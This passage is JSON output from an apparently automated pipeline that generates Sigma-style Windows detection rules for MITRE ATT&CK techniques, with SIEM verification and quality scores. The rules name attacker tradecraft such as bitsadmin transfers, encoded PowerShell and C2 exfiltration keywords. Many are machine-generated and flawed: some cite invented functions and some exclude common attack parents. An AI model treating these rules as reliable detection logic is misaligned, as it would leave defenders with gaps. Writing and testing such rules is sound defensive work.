          },
          "selection_socket": {
            "CommandLine|contains": "socket_connect"
          },
          "selection_parent_exclude": {
            "ParentImage|endswith": "\\cmd.exe"
          },
          "condition": "(selection_netstat or selection_wmic or selection_schtasks or selection_bitsadmin or selection_powershell or selection_socket) and not selection_parent_exclude"
        },
        "falsepositives": [
          "Legitimate administrators running netstat for troubleshooting",
          "System monitoring scripts that use wmic or schtasks for inventory",
          "Bitsadmin used by Windows Update or other Microsoft services",
          "PowerShell scripts that query network connections for diagnostics"
        ],
        "level": "medium",
        "tags": [
          "attack.t1049",
          "discovery"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Network Connections Discovery",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_11",
          "attack_id": "d833a3eb-96fd-45b3-8da4-735d256ff4e3",
          "detected": true,
          "events_found": 42,
          "historical_events": 0,
          "query_time_ms": 576.0000000000001,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Detection of System Information Discovery via gethostbyname, getlogin, and common discovery utilities",
        "description": "Detects processes that invoke system information discovery functions (gethostbyname, getlogin) or use common discovery command-line tools (wmic, schtasks, bitsadmin). The rule excludes typical parent processes such as explorer.exe, cmd.exe, and powershell.exe to reduce false positives.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_gethostbyname": {
            "CommandLine|contains": "gethostbyname"
          },
          "selection_getlogin": {
            "CommandLine|contains": "getlogin"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe"
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe"
          },
          "legit_parent": {
            "ParentImage|endswith": [
              "\\explorer.exe",
              "\\cmd.exe",
              "\\powershell.exe"
            ]
          },
          "condition": "(selection_gethostbyname or selection_getlogin or selection_wmic or selection_schtasks or selection_bitsadmin) and not legit_parent"
        },
        "falsepositives": [
          "Legitimate administrative scripts using wmic, schtasks, or bitsadmin for routine maintenance",
          "Developers compiling or running code that calls gethostbyname or getlogin functions",
          "System processes that invoke these utilities as part of normal operation"
        ],
        "level": "medium",
        "tags": [
          "attack.t1082",
          "attack.discovery",
          "system_information_discovery"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_12",
          "attack_id": "443f765f-e620-4322-a6c2-0a523d02fa55",
          "detected": true,
          "events_found": 44,
          "historical_events": 0,
          "query_time_ms": 527.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Detection of System Network Configuration Discovery via getsockopt and Common Admin Tools",
        "description": "Detects processes that invoke the getsockopt function or use common command-line tools associated with network configuration discovery (wmic, schtasks, bitsadmin). The rule excludes cases where the parent process is a standard command shell to reduce false positives.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_getsockopt": {
            "CommandLine|contains": "getsockopt"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe"
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe"
          },
          "parent_cmd": {
            "ParentImage|endswith": "\\cmd.exe"
          },
          "parent_powershell": {
            "ParentImage|endswith": "\\powershell.exe"
          },
          "condition": "(selection_getsockopt or selection_wmic or selection_schtasks or selection_bitsadmin) and not (parent_cmd or parent_powershell)"
        },
        "falsepositives": [
          "Legitimate administrative scripts using wmic, schtasks, or bitsadmin for system management.",
          "Custom applications that call getsockopt as part of normal network operations.",
          "System utilities (e.g., ipconfig, netsh) that may be invoked by IT staff."
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1016",
          "windows",
          "sysmon",
          "network"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Network Configuration Discovery",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_13",
          "attack_id": "75659ecf-4e23-4485-b9f7-291e6e45dc10",
          "detected": true,
          "events_found": 46,
          "historical_events": 0,
          "query_time_ms": 373.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "System Owner/User Discovery via getpwuid and System Utilities",
        "description": "Detects processes that attempt to discover the system owner or user information by invoking the Linux `getpwuid` function or by using Windows utilities such as `wmic.exe`, `schtasks.exe`, and `bitsadmin.exe`. The rule excludes executions launched from common command shells to reduce false positives.",
        "logsource": {
          "category": "process_creation",
          "product": "linux",
          "service": "sysmon"
        },
        "detection": {
          "selection_linux": {
            "Image|endswith": "python",
            "CommandLine|contains": "getpwuid"
          },
          "selection_wmic": {
            "Image|endswith": "wmic.exe"
          },
          "selection_schtasks": {
            "Image|endswith": "schtasks.exe"
          },
          "selection_bitsadmin": {
            "Image|endswith": "bitsadmin.exe"
          },
          "parent_cmd": {
            "ParentImage|endswith": "cmd.exe"
          },
          "parent_powershell": {
            "ParentImage|endswith": "powershell.exe"
          },
          "condition": "(selection_linux or selection_wmic or selection_schtasks or selection_bitsadmin) and not (parent_cmd or parent_powershell)"
        },
        "falsepositives": [
          "Legitimate administrative scripts that use wmic, schtasks, or bitsadmin for system management.",
          "Python scripts that call getpwuid for legitimate user\u2011lookup functionality.",
          "Scheduled tasks or maintenance jobs that invoke these utilities from approved automation tools."
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1033",
          "sysmon",
          "process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Owner/User Discovery",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_14",
          "attack_id": "81346fb5-8bab-48eb-9af8-dfa19a9fe2a0",
          "detected": true,
          "events_found": 52,
          "historical_events": 0,
          "query_time_ms": 533.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Application Window Discovery via proc_none and Common Enumeration Tools",
        "description": "Detects execution of the proc_none function or usage of common Windows enumeration utilities (wmic, schtasks, bitsadmin) that may be leveraged to gather application window information. Includes context checks to reduce false positives by excluding typical parent processes such as cmd.exe and services.exe.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_proc_none": {
            "Image|endswith": "\\proc_none.exe",
            "CommandLine|contains": "proc_none"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe"
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe"
          },
          "parent_exclusion": {
            "ParentImage|endswith": "\\cmd.exe"
          },
          "parent_exclusion2": {
            "ParentImage|endswith": "\\services.exe"
          },
          "condition": "(selection_proc_none or selection_wmic or selection_schtasks or selection_bitsadmin) and not (parent_exclusion or parent_exclusion2)"
        },
        "falsepositives": [
          "Legitimate administrative scripts using wmic, schtasks, or bitsadmin for system management",
          "Scheduled tasks or maintenance jobs created by IT staff",
          "System processes invoking proc_none for legitimate purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.t1010",
          "attack.discovery"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Window Discovery",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_15",
          "attack_id": "e5b972c3-6987-41c2-bd51-1c18f75ee8a6",
          "detected": true,
          "events_found": 53,
          "historical_events": 0,
          "query_time_ms": 350.00000000000006,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "System Time Discovery via Command-Line Tools",
        "description": "Detects processes that query system time using common command-line utilities such as cmd.exe, powershell.exe, wmic.exe, schtasks.exe, or bitsadmin.exe, potentially indicating system time discovery activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "time_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "time"
          },
          "time_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Get-Date"
          },
          "time_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": "os get LocalDateTime"
          },
          "time_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": "/query"
          },
          "time_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "/util"
          },
          "exclude_parent": {
            "ParentImage|endswith": "\\cmd.exe"
          },
          "condition": "(time_cmd or time_powershell or time_wmic or time_schtasks or time_bitsadmin) and not exclude_parent"
        },
        "falsepositives": [
          "Legitimate administrative scripts that query the system time.",
          "Scheduled tasks or maintenance jobs that include time checks.",
          "System utilities (e.g., time synchronization tools) that query the clock.",
          "Manual time verification by administrators using cmd or PowerShell."
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1124"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Time Discovery",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_16",
          "attack_id": "d7b195b6-b607-4813-8433-60a207a3e0c0",
          "detected": true,
          "events_found": 52,
          "historical_events": 0,
          "query_time_ms": 519.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "File Deletion via Unlink API or Proc_Rmfile Function",
        "description": "Detects processes that invoke the unlink API or proc_rmfile function, which are commonly used by malware to delete files for defense evasion. Includes additional monitoring of command-line tools (wmic, schtasks, bitsadmin) used with delete operations and excludes benign parent processes to reduce false positives.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_unlink": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "unlink"
          },
          "selection_proc_rmfile": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "proc_rmfile"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": "delete"
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": "delete"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "delete"
          },
          "benign_parent": {
            "ParentImage|endswith": "\\explorer.exe"
          },
          "condition": "(selection_unlink or selection_proc_rmfile or selection_wmic or selection_schtasks or selection_bitsadmin) and not benign_parent"
        },
        "falsepositives": [
          "Legitimate administrative scripts that use cmd.exe or PowerShell to delete temporary files via unlink or proc_rmfile.",
          "System maintenance tools (e.g., Disk Cleanup) that invoke delete operations.",
          "Scheduled tasks or WMIC commands used by IT staff for legitimate file removal."
        ],
        "level": "high",
        "tags": [
          "attack.t1070.004",
          "attack.defense_evasion",
          "windows",
          "sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "File Deletion",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_17",
          "attack_id": "5cb5c229-94b1-4f1e-8252-cbd14106e9b8",
          "detected": true,
          "events_found": 54,
          "historical_events": 0,
          "query_time_ms": 388.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Detection of Input Capture via proc_getcfg and Common Command-line Tools",
        "description": "Detects execution of processes that invoke the proc_getcfg function or use command-line utilities commonly abused for input capture (wmic, schtasks, bitsadmin). The rule excludes executions launched from typical benign parent processes such as cmd.exe, powershell.exe, and explorer.exe to reduce false positives.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_proc_getcfg": {
            "CommandLine|contains": "proc_getcfg"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe"
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe"
          },
          "parent_benign": {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\explorer.exe"
            ]
          },
          "condition": "(selection_proc_getcfg or selection_wmic or selection_schtasks or selection_bitsadmin) and not parent_benign"
        },
        "falsepositives": [
          "Legitimate administrative scripts using wmic.exe for system queries",
          "Scheduled task creation via schtasks.exe by system administrators",
          "Bitsadmin.exe used by IT for legitimate file transfers",
          "Custom internal tools that may call proc_getcfg for configuration purposes"
        ],
        "level": "high",
        "tags": [
          "attack.collection",
          "attack.t1056",
          "windows",
          "sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Input Capture",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_18",
          "attack_id": "64fa6868-b208-4d8e-ab0c-1633b69eeabe",
          "detected": true,
          "events_found": 59,
          "historical_events": 0,
          "query_time_ms": 367.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Abuse of Command-Line Tools for Application Layer C2",
        "description": "Detects usage of commonly abused command-line utilities (powershell, wmic, schtasks, bitsadmin) to perform network communication over application layer protocols, indicative of Command and Control activity. Includes context checks to reduce false positives by ensuring the parent process is not a typical benign launcher.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Invoke-WebRequest"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": "/node:"
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": "/create"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "/transfer"
          },
          "selection_generic": {
            "Image|endswith": [
              "\\powershell.exe",
              "\\cmd.exe",
              "\\wmic.exe",
              "\\schtasks.exe",
              "\\bitsadmin.exe"
            ],
            "CommandLine|contains": [
              "http://",
              "https://",
              "ftp://",
              "-enc",
              "-EncodedCommand"
            ]
          },
          "parent_benign": {
            "ParentImage|endswith": [
              "\\explorer.exe",
              "\\cmd.exe"
            ]
          },
          "condition": "(selection_powershell or selection_wmic or selection_schtasks or selection_bitsadmin or selection_generic) and not parent_benign"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell or WMIC for system inventory",
          "Scheduled task creation by IT automation tools",
          "BITS transfers performed by Windows Update or Microsoft Store",
          "Network troubleshooting commands executed by support personnel"
        ],
        "level": "high",
        "tags": [
          "attack.command_and_control",
          "attack.t1071",
          "application_layer_protocol"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_19",
          "attack_id": "32c6b150-9e15-45d4-b10d-323fa2aaecff",
          "detected": true,
          "events_found": 58,
          "historical_events": 0,
          "query_time_ms": 388.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Process Injection via Suspicious Command-Line Tools",
        "description": "Detects processes created using known injection-related command-line tools or functions such as _pthread_create, wmic, schtasks, or bitsadmin, where the parent process is not a typical legitimate shell. This helps identify potential process injection attempts used for defense evasion.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_pthread": {
            "CommandLine|contains": "_pthread_create"
          },
          "selection_wmic": {
            "CommandLine|contains": "wmic"
          },
          "selection_schtasks": {
            "CommandLine|contains": "schtasks"
          },
          "selection_bitsadmin": {
            "CommandLine|contains": "bitsadmin"
          },
          "benign_parent": {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\explorer.exe"
            ]
          },
          "condition": "(selection_pthread or selection_wmic or selection_schtasks or selection_bitsadmin) and not benign_parent"
        },
        "falsepositives": [
          "Legitimate administrative scripts that use wmic, schtasks, or bitsadmin for system management.",
          "Developers compiling applications that include the _pthread_create function for legitimate multithreading.",
          "System maintenance or deployment tools that invoke these command-line utilities."
        ],
        "level": "high",
        "tags": [
          "attack.t1055",
          "defense_evasion",
          "process_creation",
          "windows",
          "sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_20",
          "attack_id": "23cc451f-b73f-4ecb-b7f7-6421b751b597",
          "detected": true,
          "events_found": 60,
          "historical_events": 0,
          "query_time_ms": 277.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Obfuscated Files or Information via Command-Line Tools",
        "description": "Detects usage of command-line utilities (PowerShell, cmd, wmic, schtasks, bitsadmin) with indicators of obfuscation such as encoded commands. Includes context-based filtering to reduce false positives by excluding common parent processes.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "ps_obf": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-EncodedCommand"
          },
          "cmd_obf": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "powershell -enc"
          },
          "wmic_obf": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": "process call create"
          },
          "schtasks_obf": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": "/create"
          },
          "bitsadmin_obf": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "/transfer"
          },
          "parent_exclude": {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\services.exe",
              "\\explorer.exe",
              "\\winlogon.exe"
            ]
          },
          "condition": "(ps_obf or cmd_obf or wmic_obf or schtasks_obf or bitsadmin_obf) and not parent_exclude"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell -EncodedCommand for deployment",
          "Scheduled task creation by IT staff via schtasks.exe",
          "Bitsadmin used by Windows Update or Microsoft Store",
          "Wmic queries performed by system monitoring tools",
          "Cmd.exe launching PowerShell for routine automation"
        ],
        "level": "high",
        "tags": [
          "attack.t1027",
          "attack.defense_evasion",
          "windows",
          "sysmon",
          "process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_21",
          "attack_id": "1696e190-b8c1-4f68-a573-6da2d6b3081a",
          "detected": true,
          "events_found": 71,
          "historical_events": 0,
          "query_time_ms": 435.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Exfiltration Over C2 Channel via Command-Line Utilities",
        "description": "Detects the use of command-line tools that are commonly abused for exfiltration over a C2 channel (PowerShell, WMIC, schtasks, bitsadmin) when they are launched by non\u2011standard parent processes, reducing false positives from legitimate administrative activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-EncodedCommand",
              "-enc",
              "-download",
              "-upload",
              "-url"
            ]
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "/node",
              "/output",
              "/append"
            ]
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": [
              "/create",
              "/run",
              "/tn"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "/download",
              "/upload"
            ]
          },
          "parent_cmd": {
            "ParentImage|endswith": "cmd.exe"
          },
          "condition": "(selection or selection_wmic or selection_schtasks or selection_bitsadmin) and not parent_cmd"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell or WMIC",
          "Scheduled task creation by IT automation tools (e.g., SCCM, Ansible)",
          "BITS transfers performed by Windows Update, Microsoft Store, or other system services",
          "System maintenance tasks launched from cmd.exe"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.t1041",
          "exfiltration_over_c2_channel"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_22",
          "attack_id": "3a65cdbb-43e9-44f3-90ad-7ad6a550ab9e",
          "detected": true,
          "events_found": 66,
          "historical_events": 0,
          "query_time_ms": 578.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Obfuscated Strings Execution via Common Windows Utilities",
        "description": "Detects execution of potentially obfuscated commands using PowerShell, WMIC, schtasks, bitsadmin, or generic base64 strings. Includes parent process context to reduce false positives.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection_powershell_enc": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-EncodedCommand"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": "process call create"
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": "/create"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "/transfer"
          },
          "selection_generic_obfusc": {
            "CommandLine|contains": "base64"
          },
          "parent_process": {
            "ParentImage|endswith": "\\cmd.exe"
          },
          "condition": "(selection_powershell or selection_powershell_enc or selection_wmic or selection_schtasks or selection_bitsadmin or selection_generic_obfusc) and not parent_process"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell with -EncodedCommand for deployment",
          "Scheduled task creation by IT staff via schtasks.exe",
          "Bitsadmin used for approved file transfers",
          "System monitoring or inventory scripts invoking wmic.exe",
          "Base64 strings used in benign data processing"
        ],
        "level": "high",
        "tags": [
          "attack.t1027",
          "attack.exfiltration",
          "process_creation",
          "sysmon",
          "obfuscation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_23",
          "attack_id": "8bf125bb-8e41-46fd-b6ed-a4a69a091557",
          "detected": true,
          "events_found": 62,
          "historical_events": 0,
          "query_time_ms": 631.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Exploitation of Public-Facing Application via Suspicious Command Execution",
        "description": "Detects execution of commonly abused command-line utilities (PowerShell, cmd, wmic, schtasks, bitsadmin) launched from unexpected parent processes, indicative of exploitation of a public-facing application.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_ps": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "/c"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe"
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe"
          },
          "legit_parent": {
            "ParentImage|endswith": "\\explorer.exe"
          },
          "condition": "(selection_ps or selection_cmd or selection_wmic or selection_schtasks or selection_bitsadmin) and not legit_parent"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell, cmd, wmic, schtasks or bitsadmin",
          "Scheduled tasks created by system administrators",
          "Remote management tools that invoke these utilities",
          "Software installers or updates that run command-line tools"
        ],
        "level": "high",
        "tags": [
          "attack.t1190",
          "attack.initial_access",
          "exploit_public_facing_application",
          "windows",
          "process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_24",
          "attack_id": "4bbac6cf-4b3c-4e28-a837-3b50b484a5b9",
          "detected": true,
          "events_found": 64,
          "historical_events": 0,
          "query_time_ms": 1092.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Archive Collected Data via Compression Utilities",
        "description": "Detects use of common compression and archiving utilities (e.g., PowerShell Compress-Archive, zip, 7z, tar) that may indicate collection of data for exfiltration. Includes context checks to reduce false positives by excluding typical parent processes such as cmd.exe and explorer.exe.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Compress-Archive"
          },
          "selection2": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "zip "
          },
          "selection3": {
            "Image|endswith": "\\7z.exe"
          },
          "selection4": {
            "Image|endswith": "\\tar.exe"
          },
          "allowed_parent1": {
            "ParentImage|endswith": "\\cmd.exe"
          },
          "allowed_parent2": {
            "ParentImage|endswith": "\\explorer.exe"
          },
          "condition": "(selection1 or selection2 or selection3 or selection4) and not (allowed_parent1 or allowed_parent2)"
        },
        "falsepositives": [
          "Legitimate administrative or backup scripts that use compression tools.",
          "Scheduled tasks or system maintenance jobs that archive logs or files.",
          "User-initiated compression of files via Explorer context menu."
        ],
        "level": "medium",
        "tags": [
          "attack.t1560",
          "attack.collection",
          "attack"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_25",
          "attack_id": "46903b3c-465d-4d27-929c-900b0b81f9f3",
          "detected": true,
          "events_found": 63,
          "historical_events": 0,
          "query_time_ms": 353.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Screen Capture Tool Execution Detection",
        "description": "Detects execution of common screen capture utilities and command\u2011line tools that can be abused to capture screenshots. Includes context checks to reduce false positives by ensuring the parent process is not a generic command shell or service host.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_snipping": {
            "Image|endswith": "\\snippingtool.exe"
          },
          "selection_mspaint": {
            "Image|endswith": "\\mspaint.exe",
            "CommandLine|contains": "PrintScreen"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "CopyFromScreen"
          },
          "selection_nircmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "nircmd.exe savescreenshot"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": "process call create"
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": "create"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "download"
          },
          "not_parent_cmd": {
            "ParentImage|endswith": "\\cmd.exe"
          },
          "not_parent_services": {
            "ParentImage|endswith": "\\services.exe"
          },
          "condition": "(selection_snipping or selection_mspaint or selection_powershell or selection_nircmd or selection_wmic or selection_schtasks or selection_bitsadmin) and not not_parent_cmd and not not_parent_services"
        },
        "falsepositives": [
          "Legitimate use of Snipping Tool or Paint by end users for documentation",
          "PowerShell scripts that capture the screen for automation or testing purposes",
          "Administrators using WMIC, SCHTASKS or BITSADMIN for legitimate system management tasks",
          "Scheduled tasks that run screenshot utilities as part of monitoring solutions"
        ],
        "level": "high",
        "tags": [
          "attack.t1113",
          "attack.collection",
          "screen_capture",
          "process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_26",
          "attack_id": "e58a3715-6095-413c-928f-dbbe8dabef2b",
          "detected": true,
          "events_found": 84,
          "historical_events": 0,
          "query_time_ms": 394.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      }
    ]
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "rules_evaluated": 27,
      "average_quality_score": 0.694,
      "passing_rules": 17,
      "failing_rules": 10,
      "langchain_evaluations": 48,
      "fallback_evaluations": 0,
      "errors": 0,
      "processing_time_ms": 26706.637000000002
    },
    "evaluation_results": [
      {
        "rule_title": "Pseudo-Terminal Setup via grantpt or posix_openpt",
        "rule_id": "unknown",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets specific system calls (grantpt, posix_openpt) associated with pseudo-terminal setup, which aligns with the TTP of defense evasion",
          "Includes documented false positives, showing awareness of legitimate use cases",
          "Efficient detection logic using simple string containment on CommandLine, which is generally fast to evaluate in SIEMs"
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events (0/0), indicating poor detection coverage in practice",
          "Relies solely on CommandLine monitoring, which can be easily bypassed via obfuscation or alternative execution methods",
          "The TTP ID is listed as 'unknown' and tactic is missing, reducing traceability to MITRE ATT&CK framework",
          "Rule may not account for all variants of command invocation (e.g., full paths, script wrappers)"
        ],
        "suggestions": [
          "Improve detection coverage by incorporating additional telemetry sources such as syscall monitoring (e.g., auditd or eBPF) instead of relying only on process command line",
          "Enhance the rule with process ancestry or parent-child context to distinguish malicious use from legitimate tools like tmux or screen",
          "Update the rule with proper MITRE ATT&CK mapping by researching and filling in the correct TTP ID and tactic",
          "Add normalization for command variations (e.g., /usr/bin/grantpt, ./grantpt) using regex or multiple selection conditions",
          "Conduct further testing in a controlled environment to validate detection capability and tune the rule accordingly"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Malicious Network Communication via Suspicious Socket Activity",
        "rule_id": "unknown",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a relevant TTP (command and control via socket activity)",
          "Includes a basic exclusion for known benign tools (e.g., Python test scripts)",
          "Uses Sysmon event source which provides detailed process context",
          "Tags align with MITRE ATT&CK (T1071.004), aiding in threat mapping"
        ],
